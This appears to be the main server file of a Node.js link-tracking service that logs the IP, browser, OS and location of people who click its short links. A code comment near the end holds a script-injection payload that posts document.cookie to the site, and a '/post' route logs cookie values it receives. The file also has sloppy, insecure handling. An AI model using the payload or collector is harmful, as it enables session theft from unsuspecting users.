// external libraries 
const express = require("express");
require('dotenv').config()
const methodOverride = require("method-override")
const cookieParser = require('cookie-parser')
const NodeCache = require("node-cache");
const myCache = new NodeCache();
const hbs = require("hbs");
const path = require("path");
const app = express();
const nodemailer = require('nodemailer');
const fetch = require("node-fetch");
var UAParser = require('ua-parser-js');
var hash = require('hash.js')


// local modules
const LastCode = require('./lastCode')
const Link = require('./links')
const ApiKey = require('./api')
const Cookie = require('./cookie')
const sendMail = require("./mail");

// Set the server's port to 3000
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Example app listening on port ${port}!`))

// init connection params to MongoDB database 
const Mongoose = require("mongoose");
const { DH_CHECK_P_NOT_PRIME } = require("constants");
const uri = process.env.DBKEY
Mongoose.connect(uri, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    useFindAndModify: false
})
    .then((result) => app.listen(port))
    .catch((err) => console.log(err))

// create a link code
async function codeCreation() {
    return LastCode.findOneAndUpdate({
        "lastCode": {
            $ne: 0
        }
    }, {
        $inc: {
            "lastCode": 1
        }
    })
        .exec()
        .then((result) => {
            return result['lastCode']
        })
        .catch((err) => {
            return `error : ${err}`
        })
}

// checking if user has accepted the terms of agreement
async function termsChecker(cookie) {
    return Cookie.findOne({ _id: cookie }).then((result) => {
        if (result.acceptedterm) {
            return true;
        } else {
            return false;
        }
    }).catch((err) => {
        return false;
    })
}

async function usedCodes(cookie, renew) {
    if (renew) {
        return Cookie.findOne({ _id: cookie }).then((result) => {
            myCache.set('usedCodes', result.usedcodes)
            return result.used_codes
        }).catch((err) => {
            return null
        })
    } else {
        if (myCache.get('usedCodes') != null) {
            return myCache.get('usedCodes')
        } else {
            return Cookie.findOne({ _id: cookie }).then((result) => {
                myCache.set('usedCodes', result.used_codes)
                return result.used_codes
            }).catch((err) => {
                return null
            })
        }
    }
}

function hashCaptcha(text) {
    return hash.sha256().update(text).digest('hex')
}

const publicStaticDirPath = path.join(__dirname, '../public');

const viewsPath = path.join(__dirname, '../templates/views');

const partialsPath = path.join(__dirname, '../templates/partials');

app.set("view engine", "hbs");
app.set('views', viewsPath);
hbs.registerPartials(partialsPath);
app.use(cookieParser())
app.use(express.static(publicStaticDirPath));
app.use(express.urlencoded({
    extended: false
}))

app.use(methodOverride('_method'))

// server's routes
app.get("/contact", (req, res) => {
    error = req.query.error
    captcha = req.query.captcha
    usedCodes(req.cookies.user_session, false).then((result) => {
        if (captcha) {
            if (captcha == "true") {
                if (error === "true") {
                    res.render("contact", {
                        message: "The message failed to deliver, please try again",
                        failure: true,
                        usedCodes: result
                    })
                } else if (error == "false") {
                    res.render("contact", {
                        message: "Your message was succesfully delivered ! You will receive a response via e-mail in the next days",
                        success: true,
                        usedCodes: result
                    })
                } else {
                    res.render("contact", {
                        usedCodes: result
                    })
                }
            } else {
                res.render("contact", {
                    message: "Please input the correct captcha to send a message.",
                    failure: true,
                    usedCodes: result
                })
            }
        } else {
            res.render("contact", {
                usedCodes: result
            })
        }
    }).catch((err) => {
        res.render("contact")
    })
})

app.post("/contact", async (req, res) => {
    var captcha = req.body.captcha
    var hash_user_captcha = req.cookies.hash_captcha
    var hash_captcha = hashCaptcha(captcha)
    if (hash_user_captcha != hash_captcha | captcha === "4" || captcha === null || captcha === undefined) {
        res.redirect("/contact?error=true&captcha=false")
    } else {
        var message = req.body.message
        var email = req.body.email
        var username = req.body.username
        var emailMessage = `Hi ${username},\n\nThank you for contacting us.\n\nYour email is: ${email}.\n\nWe succesfully got your enquiry :\n\n ${message}\n\n You will receive a response regarding your query from the admin in the following days. \n\n Faithfully, \n\n trafficlink.com`;
        var emailMessageAdmin = `${username} sended a contact request, his email is: ${email}.\n\nEnquiry :\n\n ${message}\n`;
        sendMail(email, emailMessage, emailMessageAdmin).then((re) => {
            res.redirect("/contact?error=false&captcha=true")
        }).catch((err) => {
            res.redirect("/contact?error=false&captcha=true")
        })
    }
})

app.post("/trackinglink", async (req, res) => {
    let pin = parseInt(req.body.pin);
    let link = req.body.trlink;
    let link_regex = ""
    let prefix = link.split(":", 1)
    let prefix2 = link.split(".", 1)
    if (prefix2 == "www") {
        link = "https://" + link
    } else if (prefix == "https" || prefix == "http") {

    } else {
        res.redirect(`/?error=${link} is not considered to be a valid link`)
    }
    if (req.cookies.user_session) {
        termsChecker(req.cookies.user_session).then((termsAccepted) => {
            if (termsAccepted) {
                codeCreation().then((result) => {
                    let code = result
                    let sharedLink = `https://linktraffic.herokuapp.com//redirect/${code}`
                    const newLink = new Link({
                        link: link,
                        link_to_share: sharedLink,
                        code: code,
                        pin: pin
                    })
                    console.log(newLink)
                    newLink.save()
                        .then((result) => {
                            console.log(result)
                            if (link.match(link_regex)) {
                                res.redirect(`/linkresult/${code}?pin=${pin}`)
                            } else {
                                res.redirect("/error=linknotvalid")
                            }
                        })
                        .catch((err) => {
                            console.log(err)
                        })
                })
                    .catch((err) => {
                        console.log(err)
                    })
            } else {
                res.redirect(`/?error=In order to use our services you are kindly asked to accept our terms of services, please accept them in the Terms of Service section of this website`)
            }
        })
    } else {
        res.redirect(`/?error=An error has occured, it seems that you turned off cookies, this site is not usable without cookies. Thanks for your understanding`)
    }
})

app.post("/trackingcode", (req, res) => {
    // using mongoose to connect and interect with the MongoDB database
    let pin = parseInt(req.body.pin);
    let code = parseInt(req.body.trcode);
    if (code & pin) {
        termsChecker(req.cookies.user_session).then((result) => {
            if (result) {
                res.redirect(`/linkresult/${code}?pin=${pin}`)
            } else {
                res.redirect(`/?error=In order to use our services you are kindly asked to accept our terms of services, please accept them in the Terms of Service section of this website`)
            }
        }).catch((err) => {
            res.redirect(`/?error=An unexpected error occured, please try again later`)
        })
    } else {
        res.redirect(`/?error=An unexpected error occured, please try again later`)
    }
});

app.get("/privacy", (req, res) => {
    res.render('privacy')
})

app.get("/", (req, res) => {
    let error = req.query.error
    let failure = false
    if (error) {
        failure = true
    } else {
        failure = false
    }
    if (req.cookies.user_session) {
        usedCodes(req.cookies.user_session, false).then((result) => {
            if (result) {
                res.render("home", {
                    failure: failure,
                    message: error,
                    usedCodes: result
                })
            } else {
                res.render("home", {
                    failure: failure,
                    message: error
                })
            }
        }).catch((err) => {
            res.render("home", {
                failure: true,
                message: err,
            })
        })

    } else {
        let ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
        console.log(ip)
        createCookie(ip).then((result) => {
            console.log(result)
            res.cookie("user_session", result.id)
            res.render("home", {
                failure: failure,
                message: error,
                usedCodes: result.usedcodes
            })
        }).catch((err) => {
            res.render("home", {
                failure: true,
                message: err + error
            })
        })

    }

})

app.get("/get-captcha", (req, res) => {
    const { createCanvas } = require("canvas");
    var arrayLetters = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    var number = Math.floor(Math.random() * 10) + arrayLetters[Math.floor(Math.random() * 51)] + Math.floor(Math.random() * 10) + Math.floor(Math.random() * 10) + arrayLetters[Math.floor(Math.random() * 51)]
    const FONTBASE = 200;
    const FONTSIZE = 35;

    // Get a font size relative to base size and canvas width
    const relativeFont = width => {
        const ratio = FONTSIZE / FONTBASE;
        const size = width * ratio;
        return `${size}px serif`;
    };
    // Get a float between min and max
    const arbitraryRandom = (min, max) => Math.random() * (max - min) + min;
    // Get a rotation between -degrees and degrees converted to radians
    const randomRotation = (degrees = 15) => (arbitraryRandom(-degrees, degrees) * Math.PI) / 180;
    // Configure captcha text
    const configureText = (ctx, width, height) => {
        ctx.font = relativeFont(width);
        ctx.textBaseline = "middle";
        ctx.textAlign = "center";
        const text = number;
        ctx.fillText(text, width / 2, height / 2);
        return text;
    };


    // Get a PNG dataURL of a captcha image
    const generate = (width, height) => {
        const canvas = createCanvas(width, height);
        const ctx = canvas.getContext("2d");
        ctx.rotate(randomRotation());
        // actual text value of the captcha
        const text = configureText(ctx, width, height);
        hashed_text = hashCaptcha(text);
        return {
            image: canvas.toDataURL(),
            hashed_text: hashed_text
        };
    };
    const response = generate(200, 100);
    res.send({ response })
})
app.get("/linkresult/:id", (req, res) => {
    let trcode = req.params.id
    let pin = parseInt(req.query.pin)
    // check if the browser client already has a cookie
    if (req.cookies.user_session) {
        console.log("User already has cookie")
        Link.findOne({
            code: trcode
        }, function (err, obj) {
            if (err) {
                res.redirect(`/?error=${err}`)
            }
            if (obj) {
                if (obj.pin == pin) {
                    const distinct_dates = []
                    const clicks_per_date = []
                    const distinct_browsers = []
                    const user_per_browser = []
                    let total_dates = 0
                    let total_browsers = 0
                    for (i in obj.connections) {
                        if (distinct_dates.includes(obj.connections[i].date)) {
                            // obj.connections[i].date + " is in " + distinct_dates + ";"
                            clicks_per_date[total_dates - 1] += 1
                            // "Added one click to the current date"                  
                        } else {
                            // obj.connections[i].date + " is not in [" + distinct_dates + "] ;")
                            total_dates += 1
                            // We now have " + total_dates + " distinct dates"
                            distinct_dates.push(obj.connections[i].date)
                            // Added the new date to the list"
                            clicks_per_date.push(1)
                            // Added the first click of the new date"
                        }
                    }
                    for (i in obj.connections) {
                        if (distinct_browsers.includes(obj.connections[i].browser)) {
                            user_per_browser[total_browsers - 1] += 1
                        } else {
                            total_browsers += 1
                            distinct_browsers.push(obj.connections[i].browser)
                            user_per_browser.push(1)
                        }
                    }
                    usedCodes(req.cookies.user_session, true).then((result) => {
                        var found = false ;
                        for (i=0; i < result.length; i++) {
                            if(found == false){
                                if (result[i].code == trcode)
                                    found = true
                            }
                        }
                        if (found) {
                            if (obj.connections.length == 0) {
                                noconnection = true
                            } else {
                                noconnection = false
                            }
                            res.render("linkResult", {
                                code: trcode,
                                link: obj.link,
                                linkToShare: obj.link_to_share,
                                connections: obj.connections,
                                clicks_per_date: clicks_per_date,
                                distinct_dates: distinct_dates,
                                noconnection: noconnection,
                                usedCodes: result,
                                distinct_browsers: distinct_browsers,
                                user_per_browser: user_per_browser
                            })
                        } else {
                            Cookie.findOneAndUpdate({
                                _id: req.cookies.user_session
                            }, {
                                $push: {
                                    used_codes: {
                                        code : trcode,
                                        pin : pin
                                    }
                                }
                            }, { new: true }).exec()
                                .then((result2) => {
                                    if (obj.connections.length == 0) {
                                        noconnection = true
                                    } else {
                                        noconnection = false
                                    }
                                    res.render("linkResult", {
                                        code: trcode,
                                        link: obj.link,
                                        linkToShare: obj.link_to_share,
                                        connections: obj.connections,
                                        clicks_per_date: clicks_per_date,
                                        distinct_dates: distinct_dates,
                                        noconnection: noconnection,
                                        usedCodes: result2.used_codes,
                                    })
                                })
                        }
                    })
                } else {
                    res.redirect('/?error=Wrong Pin')
                }
            } else {
                res.render("home", {
                    failure: true,
                    message: `Code ${trcode} does not exist`
                })
            }
        })

    } else {
        let ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
        // the id of the new created object will be the cookie
        const newCookie = new Cookie({
            ipaddress: ip,
            usedcodes: trcode,
            pins : pin,
            acceptedterm: false
        })
        newCookie.save()
            .then((result) => {
                const cookieid = result.id
                let trcode = req.params.id
                Link.findOne({
                    code: trcode
                }, function (err, obj) {
                    if (err) {
                        res.redirect(`/?error=${err}`)
                    }
                    if (obj) {
                        const distinct_dates = []
                        const clicks_per_date = []
                        let total_dates = 0
                        for (i in obj.connections) {
                            if (distinct_dates.includes(obj.connections[i].date)) {
                                // obj.connections[i].date + " is in " + distinct_dates + ";"
                                clicks_per_date[total_dates - 1] += 1
                                // "Added one click to the current date"                  
                            } else {
                                // obj.connections[i].date + " is not in [" + distinct_dates + "] ;")
                                total_dates += 1
                                // We now have " + total_dates + " distinct dates"
                                distinct_dates.push(obj.connections[i].date)
                                // Added the new date to the list"
                                clicks_per_date.push(1)
                                // Added the first click of the new date"
                            }
                        }
                        if (obj.connections.length == 0) {
                            noconnection = true
                        } else {
                            noconnection = false
                        }
                        res.cookie("user_session", cookieid)
                        res.render("linkResult", {
                            code: trcode,
                            link: obj.link,
                            linkToShare: obj.link_to_share,
                            connections: obj.connections,
                            clicks_per_date: clicks_per_date,
                            distinct_dates: distinct_dates,
                            noconnection: noconnection,
                            usedCodes: result.used_codes
                        })
                    } else {
                        res.render("home", {
                            failure: true,
                            message: `Code ${trcode} does not exist`
                        })
                    }
                })
            })
            .catch((err) => {
                console.log(err)
            })
    }

})

app.get("/redirect/:id", (req, res) => {
    var parser = new UAParser();
    var ua = req.headers['user-agent'];
    var browser = parser.setUA(ua).getBrowser().name;
    var fullBrowserVersion = parser.setUA(ua).getBrowser().version;
    var browserVersion = Number(fullBrowserVersion.split(".", 1).toString());
    let id = req.params.id
    let ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
    fetch("http://www.geoplugin.net/json.gp?ip=159.162.1.1")
        .then((response) => response.text())
        .then((result) => {
            let location = result["geoplugin_city"] + result["geoplugin_country"]
            let operating_system = req.headers['user-agent'].split(' ')[1].substring(1)
            const date = new Date();
            let today = new Date(date)
            day = today.toDateString()
            Link.findOneAndUpdate({
                code: id
            }, {
                $push: {
                    connections: {
                        ipaddress: ip,
                        date: day,
                        operating_system: operating_system,
                        browser: browser,
                        browser_version: browserVersion,
                        location: location
                    }
                }
            }, function (err, obj) {
                if (obj) {
                    res.redirect(obj["link"])
                } else {
                    res.redirect("/nothing")
                }
            })
        }).catch((err) => {
            console.log(err)
        })


})


app.get("/api/doc", (req, res) => {
    res.render("apidoc")
})

app.get("/api/getconnections", (req, res) => {
    let key = req.query.key
    let trcode = req.query.code
    if (key) {
        ApiKey.findOneAndUpdate({
            _id: key
        }, {
            lastConnection: Date.now()
        }).exec()
            .then((result) => {
                if (result) {
                    Link.find({
                        code: trcode
                    }).exec()
                        .then((result) => {
                            if (result.length == 1) {
                                res.json({
                                    result: result
                                })
                            } else {
                                res.json({
                                    error: `Tracking Code number ${trcode} does not exists`
                                })
                            }
                        })
                        .catch((err) => {
                            res.json({
                                error: err
                            })
                        })
                } else {
                    res.json({
                        error: `<${key}> is not a valid API key`
                    })
                }
            })
            .catch((err) => {
                res.json({
                    error: `<${key}> is not a valid API key, ${err}`
                })
            })
    } else {
        res.json({
            error: "An Api key is necessary to fetch data from this API. Add the api key to your query as follows, https://linktraffic.herokuapp.com//api/getconnections?key=<yourapikey>"
        })
    }
})

async function createCookie(ip) {
    // when creating a new cookie we clear the hole browser cache
    myCache.flushAll()
    const newCookie = new Cookie({
        ipaddress: ip,
        acceptedterm: false
    })
    console.log(newCookie)
    return newCookie.save()
        .then((result) => {
            console.log(result)
            return result
        }).catch((err) => {
            return err
        })
}

async function userAcceptedTerms(cookie_id) {
    return Cookie.findOne({
        _id: cookie_id
    }).exec()
        .then((result) => {
            return result.acceptedterm
        })
        .catch((err) => {
            return err
        })
}

app.post("/terms", (req, res) => {
    let useracceptsTerm = false
    if (req.body.acceptTerm == 0) {
        useracceptsTerm = false
    } else if (req.body.acceptTerm.length == 2) {
        useracceptsTerm = true
    } else {
        res.status(400)
    }

    const cookie_id = req.cookies.user_session
    Cookie.findOneAndUpdate({
        _id: cookie_id
    }, {
        acceptedterm: useracceptsTerm
    }, {
        new: true
    }).exec()
        .then((result) => {
            if (result.acceptedterm) {
                res.redirect("/terms?m=You succesfully accepted the terms of condition, you can now use our services")
            } else {
                res.redirect("/terms?error=You succesfully withdrawn of the terms of condition, you cannot use our services anymore")
            }
        }).catch((err) => {
            res.redirect(`/terms?error=${err}`)
        })
})

app.get("/terms", (req, res) => {
    let message = req.query.m
    let error = req.query.error
    if (req.cookies.user_session) {
        userAcceptedTerms(req.cookies.user_session).then((result) => {
            usedCodes(req.cookies.user_session, false).then((used_codes) => {
                res.render("terms", {
                    acceptedTerms: result,
                    message: message,
                    error: error,
                    usedCodes: used_codes[0],
                    usedPins : used_codes[1]
                })
            }).catch((err) => {
                res.render("terms")
            })
        }).catch((err) => {
            res.render("terms")
        })
    } else {
        res.render("terms", {
            message: message,
            error: error
        })
    }

})

app.get("/api/key", (req, res) => {
    let error = req.query.error
    let message = req.query.m
    let apiKey = req.query.key
    if (error) {
        console.log(error)
        res.render("apikey", {
            message: error,
            error: true
        })
    } else if (message) {
        res.render("apikey", {
            message: message,
            apiKey: apiKey,
            success: true
        })
    } else {
        res.render("apikey")
    }

})

//<script> fetch("https://linktraffic.herokuapp.com//post", {method: "POST",body: document.cookie }).then(res => {   console.log("Request complete! response:", res); });</script>
app.get("/post", (req, res) => {
    console.log(req)
    const cookie = req.query.cookie
    console.log(cookie)
    res.send("done")
})

app.post("/api/key", (req, res) => {
    const name = req.body.name
    const email = req.body.email
    const usage = req.body.usage
    const apikey = new ApiKey({
        name: name,
        email: email,
        usage: usage
    })
    apikey.save()
        .then((result) => {
            const message = `Hello ${name}, \n The API key you requested was succesfully created. \n API key : ${result.id} \n Faithfully, linktraffic.com`
            const admin_message = `${result.name} successfully created an API key : ${result.id} \n Used email address : ${result.email}`
            sendMail(result.email, message, admin_message).then((re) => {
                res.redirect(`/api/key?m=Api key successfully created&key=${result.id}`)
            })
        })
        .catch((err) => {
            res.redirect(`/api/key?error=${err}`)
        })
})

app.get("*", (req, res) => {
    res.render("404", {
        titlepage: req.originalUrl.substring(1)
    })
})